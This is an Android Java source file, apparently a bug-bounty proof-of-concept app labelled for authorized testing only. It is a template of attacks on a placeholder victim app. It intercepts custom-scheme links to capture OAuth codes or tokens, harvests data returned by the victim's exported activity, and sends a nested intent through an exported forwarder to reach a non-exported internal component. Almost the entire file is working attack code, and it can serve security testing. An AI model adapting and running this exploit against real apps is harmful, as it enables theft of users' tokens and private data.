package com.hunt.poc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

/**
 * HuntPoC — AUTHORIZED TESTING ONLY, your own device + your own test accounts.
 * Captures and displays/logs (tag HUNTPOC):
 *   1) intercepted custom-scheme URIs (OAuth code / token theft proof)
 *   2) setResult() data from the victim's exported activity (data-leak proof)
 *   3) a nested-intent redirection demo through the victim's exported forwarder
 */
public class MainActivity extends Activity {
    private static final String TAG = "HUNTPOC";

    // ---- EDIT THESE for your finding ----
    private static final String VICTIM_PKG = "com.VICTIM.PKG";
    private static final String VICTIM_EXPORTED_ACTIVITY = VICTIM_PKG + ".ExportedActivity";
    private static final String VICTIM_INTERNAL_COMPONENT = VICTIM_PKG + ".InternalActivity";
    private static final String FORWARD_EXTRA = "intent"; // extra name the victim forwards
    // -------------------------------------

    private TextView tv;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        tv = new TextView(this);
        tv.setTextIsSelectable(true);
        setContentView(tv);

        // (1) Did we intercept a scheme link?
        Intent i = getIntent();
        if (Intent.ACTION_VIEW.equals(i.getAction()) && i.getData() != null) {
            capture("INTERCEPTED-URI", i.getData().toString());
        }
    }

    // (2) Launch the victim's exported activity for its result — leaks via setResult().
    public void launchVictimForResult() {
        Intent i = new Intent();
        i.setComponent(new ComponentName(VICTIM_PKG, VICTIM_EXPORTED_ACTIVITY));
        try {
            startActivityForResult(i, 0xBEEF);
        } catch (Exception e) {
            capture("LAUNCH-FAIL", e.toString());
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        capture("SETRESULT-LEAK", "rc=" + resultCode + " data=" +
                (data == null ? "null" : data.toUri(Intent.URI_INTENT_SCHEME)));
    }

    // (3) Intent redirection: nested intent to the victim's NON-exported component,
    //     delivered through its exported forwarder.
    public void fireRedirection() {
        Intent inner = new Intent();
        inner.setComponent(new ComponentName(VICTIM_PKG, VICTIM_INTERNAL_COMPONENT));
        // inner.setData(Uri.parse("content://" + VICTIM_PKG + ".provider/root/"));
        // inner.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        Intent outer = new Intent();
        outer.setComponent(new ComponentName(VICTIM_PKG, VICTIM_EXPORTED_ACTIVITY));
        outer.putExtra(FORWARD_EXTRA, inner);
        try {
            startActivity(outer);
            capture("REDIRECT-FIRED", outer.toUri(Intent.URI_INTENT_SCHEME));
        } catch (Exception e) {
            capture("REDIRECT-FAIL", e.toString());
        }
    }

    private void capture(String label, String value) {
        Log.i(TAG, label + ": " + value);
        tv.append("\n[" + label + "]\n" + value + "\n");
    }
}
